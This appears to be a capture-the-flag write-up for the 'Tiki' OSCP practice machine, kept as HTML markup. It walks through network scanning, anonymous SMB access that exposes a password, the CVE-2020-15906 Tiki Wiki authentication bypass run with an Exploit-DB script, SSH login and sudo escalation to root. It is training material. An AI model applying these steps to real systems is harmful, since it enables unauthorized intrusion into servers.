@@ -1,0 +1,279 @@
+I"F<p>This machine was created by <strong>Silky</strong>, this is an OSCP Prep Box, we need to research about a 0day discovered in 2020.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>With a ping sweep performed on the local network was possible to locate our target host.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tiki<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-sn</span> 192.168.179.1/24
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-06 20:52 <span class="nt">-05</span>
+Nmap scan report <span class="k">for </span>192.168.179.162
+Host is up <span class="o">(</span>0.00056s latency<span class="o">)</span><span class="nb">.</span>
+MAC Address: 00:0C:29:0A:0C:8A <span class="o">(</span>VMware<span class="o">)</span>
+Nmap scan report <span class="k">for </span>192.168.179.254
+Host is up <span class="o">(</span>0.00069s latency<span class="o">)</span><span class="nb">.</span>
+MAC Address: 00:50:56:F3:D6:F4 <span class="o">(</span>VMware<span class="o">)</span>
+Nmap scan report <span class="k">for </span>192.168.179.1
+Host is up.
+Nmap <span class="k">done</span>: 256 IP addresses <span class="o">(</span>3 hosts up<span class="o">)</span> scanned <span class="k">in </span>4.64 seconds
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>A full TCP port scann was performed to discover open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tiki<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-T4</span> <span class="nt">-v</span> <span class="nt">-p1-65535</span> 192.168.179.162 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
+...
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>With nmap I performed service enumeration, OS detection, script scanning and traceroute.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tiki<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-A</span> <span class="nt">-p22</span>,80,139,445 192.168.179.162 <span class="nt">-oN</span> nmap/enum-tcp-services.txt
+...
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   3072 a3:d8:4a:89:a9:25:6d:07:c5:3d:76:28:06:ed:d1:c0 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 e7:b2:89:05:54:57:dc:02:f4:8c:3a:7c:55:8b:51:aa <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 fd:77:07:2b:4a:16:3a:01:6b:e0:00:0c:0a:36:d8:2f <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open  http        Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods:
+|_  Supported Methods: OPTIONS HEAD GET POST
+| http-robots.txt: 1 disallowed entry
+|_/tiki/
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+MAC Address: 00:0C:29:0A:0C:8A <span class="o">(</span>VMware<span class="o">)</span>
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 5.0 - 5.3 <span class="o">(</span>99%<span class="o">)</span>, Linux 2.6.32 <span class="o">(</span>96%<span class="o">)</span>, Linux 3.2 - 4.9 <span class="o">(</span>96%<span class="o">)</span>, Netgear ReadyNAS 2100 <span class="o">(</span>RAIDiator 4.2.24<span class="o">)</span> <span class="o">(</span>96%<span class="o">)</span>, Linux 2.6.32 - 3.10 <span class="o">(</span>96%<span class="o">)</span>, Linux 4.15 - 5.6 <span class="o">(</span>96%<span class="o">)</span>, Linux 5.3 - 5.4 <span class="o">(</span>96%<span class="o">)</span>, Sony X75CH-series Android TV <span class="o">(</span>Android 5.0<span class="o">)</span> <span class="o">(</span>95%<span class="o">)</span>, Linux 3.1 <span class="o">(</span>95%<span class="o">)</span>, Linux 3.2 <span class="o">(</span>95%<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
+Uptime guess: 5.314 days <span class="o">(</span>since Wed Nov 10 13:24:17 2021<span class="o">)</span>
+Network Distance: 1 hop
+TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span>263 <span class="o">(</span>Good luck!<span class="o">)</span>
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| nbstat: NetBIOS name: UBUNTU, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
+| Names:
+|   UBUNTU&lt;00&gt;           Flags: &lt;unique&gt;&lt;active&gt;
+|   UBUNTU&lt;03&gt;           Flags: &lt;unique&gt;&lt;active&gt;
+|   UBUNTU&lt;20&gt;           Flags: &lt;unique&gt;&lt;active&gt;
+|   <span class="se">\x</span>01<span class="se">\x</span>02__MSBROWSE__<span class="se">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
+|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   <span class="nb">date</span>: 2021-11-16T01:56:54
+|_  start_date: N/A
+</code></pre></div></div>
+
+<h3 id="samba-enumeration">Samba Enumeration</h3>
+
+<p>Enumerating with enum4linux I found a system user and a shared folder named Notes.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tiki<span class="nv">$ </span>enum4linux <span class="nt">-a</span> 192.168.179.162
+...
+ <span class="o">================================</span> 
+|    Users on 192.168.179.162    |
+ <span class="o">================================</span> 
+index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: silky    Name: Silky     Desc: 
+
+user:[silky] rid:[0x3e8]
+
+ <span class="o">============================================</span> 
+|    Share Enumeration on 192.168.179.162    |
+ <span class="o">============================================</span> 
+
+        Sharename       Type      Comment 
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span> 
+        print<span class="nv">$ </span>         Disk      Printer Drivers
+        Notes           Disk      My Notes
+        IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>ubuntu server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
+</code></pre></div></div>
+
+<p>An anonymous login to the shared folder Notes allowed me to find a Mail.txt file, so I downloaded it to the attacking machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tiki<span class="nv">$ </span>smbclient //192.168.179.162/Notes <span class="nt">-N</span>
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Wed Jul 29 08:52:09 2020
+  ..                                  D        0  Thu Jul 30 14:32:11 2020
+  Mail.txt                            N      244  Wed Jul 29 08:52:05 2020
+
+                19992176 blocks of size 1024. 10688056 blocks available
+                
+smb: <span class="se">\&gt;</span> get Mail.txt
+getting file <span class="se">\M</span>ail.txt of size 244 as Mail.txt <span class="o">(</span>2.9 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 2.9 KiloBytes/sec<span class="o">)</span>
+</code></pre></div></div>
+
+<p>This file contains a password for the silky user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tiki<span class="nv">$ </span><span class="nb">cat </span>Mail.txt 
+Hi Silky
+because of a current Breach we had to change all Passwords,
+please note that it was a 0day, we don<span class="s1">'t know how he made it.
+
+Your new CMS-password is now 51lky571k1, 
+please investigate how he made it into our Admin Panel.
+
+Cheers Boss.
+</span></code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>The scan with nmap reveals that the robots.txt file is available, I accessed it and found a directory called tiki.</p>
+
+<p><img src="/assets/images/tiki/screenshot-1.png" alt="" /></p>
+
+<p>This redirected me to the tikiwiki homepage.</p>
+
+<p><img src="/assets/images/tiki/screenshot-2.png" alt="" /></p>
+
+<p>I logged in as the silky user, but couldn’t find a way to execute system commands.</p>
+
+<p><img src="/assets/images/tiki/screenshot-3.png" alt="" /></p>
+
+<p><img src="/assets/images/tiki/screenshot-4.png" alt="" /></p>
+
+<p>So I focused to locate its current version.</p>
+
+<p><img src="/assets/images/tiki/screenshot-5.png" alt="" /></p>
+
+<p>There’s an exploit available for this tikiwiki version.</p>
+
+<p>Authentication Bypass vulnerability, allows remote unauthenticated attackers to bypass the login page which results in a full compromise of Tiki WikiCMS. An Attacker is able to bruteforce the Admin account until it is locked. After that an emptyPassword can be used to authenticate as admin to get access, more information about this vulnerability you can find it <a href="https://github.com/S1lkys/CVE-2020-15906">here</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tiki<span class="nv">$ </span>searchsploit tiki wiki 21.1
+<span class="nt">------------------------------------------------------------</span> <span class="nt">------------------------</span>
+ Exploit Title                                              |  Path
+<span class="nt">------------------------------------------------------------</span> <span class="nt">------------------------</span>
+Tiki Wiki CMS Groupware 21.1 - Authentication Bypass        | php/webapps/48927.py
+<span class="nt">------------------------------------------------------------</span> <span class="nt">------------------------</span>
+</code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>I performed a copy of this exploit to my current directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tiki<span class="nv">$ </span>searchsploit <span class="nt">-m</span> php/webapps/48927.py
+root@kali:~/tiki<span class="nv">$ </span><span class="nb">cp </span>48927.py exp.py
+</code></pre></div></div>
+
+<p>I ran the script adding as parameter the IP address of the victim machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tiki<span class="nv">$ </span>python3 exp.py 192.168.179.162
+Admin Password got removed.
+Use BurpSuite to login into admin without a password 
+Admin Password got removed.
+Use BurpSuite to login into admin without a password 
+Admin Password got removed.
+Use BurpSuite to login into admin without a password 
+Admin Password got removed.
+Use BurpSuite to login into admin without a password 
+Admin Password got removed.
+Use BurpSuite to login into admin without a password 
+Admin Password got removed.
+Use BurpSuite to login into admin without a password 
+Admin Password got removed.
+Use BurpSuite to login into admin without a password 
+Admin Password got removed.
+Use BurpSuite to login into admin without a password 
+Admin Password got removed.
+Use BurpSuite to login into admin without a password 
+Admin Password got removed.
+Use BurpSuite to login into admin without a password 
+Admin Password got removed.
+Use BurpSuite to login into admin without a password 
+Admin Password got removed.
+Use BurpSuite to login into admin without a password 
+Admin Password got removed.
+Use BurpSuite to login into admin without a password
+</code></pre></div></div>
+
+<p>You need set up a web proxy to intercept the form’s post request and remove the password field value, as shown below:</p>
+
+<p><img src="/assets/images/tiki/screenshot-6.png" alt="" /></p>
+
+<p>We have logged in as the admin user.</p>
+
+<p><img src="/assets/images/tiki/screenshot-7.png" alt="" /></p>
+
+<p>In the following path I found a post called Credentials.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Wiki <span class="o">&gt;</span> List Pages
+</code></pre></div></div>
+
+<p><img src="/assets/images/tiki/screenshot-8.png" alt="" /></p>
+
+<p>I clicked on Credentials and discovered the silky’s password.</p>
+
+<p><img src="/assets/images/tiki/screenshot-9.png" alt="" /></p>
+
+<h3 id="access-via-ssh">Access via SSH</h3>
+
+<p>I accessed to the server via SSH as the silky user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tiki<span class="nv">$ </span>ssh silky@192.168.179.162                                                                                                                         
+silky@192.168.179.162<span class="s1">'s password:                                                                                                                                   
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-42-generic x86_64)                                                                                                 
+                                                                                                                                                                    
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+1 Aktualisierung kann sofort installiert werden.
+0 dieser Aktualisierung sind Sicherheitsaktualisierungen.
+Um zu sehen, wie diese zusätzlichen Updates ausgeführt werden: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+Last login: Fri Jul 31 09:50:24 2020 from 192.168.56.1
+silky@ubuntu:~$ id
+uid=1000(silky) gid=1000(silky) Gruppen=1000(silky),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)
+</span></code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sudo-permissions">Sudo Permissions</h3>
+
+<p>The silky user belongs to the sudo group, to get root you just need tu execute the following command specifying his password.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>silky@ubuntu:~<span class="nv">$ </span><span class="nb">sudo </span>su -
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> Passwort für silky:
+root@ubuntu:~# <span class="nb">whoami
+</span>root
+root@ubuntu:~# <span class="nb">ls
+</span>flag.txt
+root@ubuntu:~# <span class="nb">cat </span>flag.txt 
+
+ ██████╗ ██████╗ ███╗   ██╗ ██████╗ ██████╗  █████╗ ████████╗██╗   ██╗██╗      █████╗ ████████╗██╗ ██████╗ ███╗   ██╗███████╗██╗
+██╔════╝██╔═══██╗████╗  ██║██╔════╝ ██╔══██╗██╔══██╗╚══██╔══╝██║   ██║██║     ██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝██║
+██║     ██║   ██║██╔██╗ ██║██║  ███╗██████╔╝███████║   ██║   ██║   ██║██║     ███████║   ██║   ██║██║   ██║██╔██╗ ██║███████╗██║
+██║     ██║   ██║██║╚██╗██║██║   ██║██╔══██╗██╔══██║   ██║   ██║   ██║██║     ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║╚════██║╚═╝
+╚██████╗╚██████╔╝██║ ╚████║╚██████╔╝██║  ██║██║  ██║   ██║   ╚██████╔╝███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║███████║██╗
+ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝
+                                                                                                                                
+You did it ^^
+I hope you had fun.
+Share your flag with me on Twitter: S1lky_1337
+
+
+flag:88d8120f434c3b4221937a8cd0668588
+
+</code></pre></div></div>
+:ET
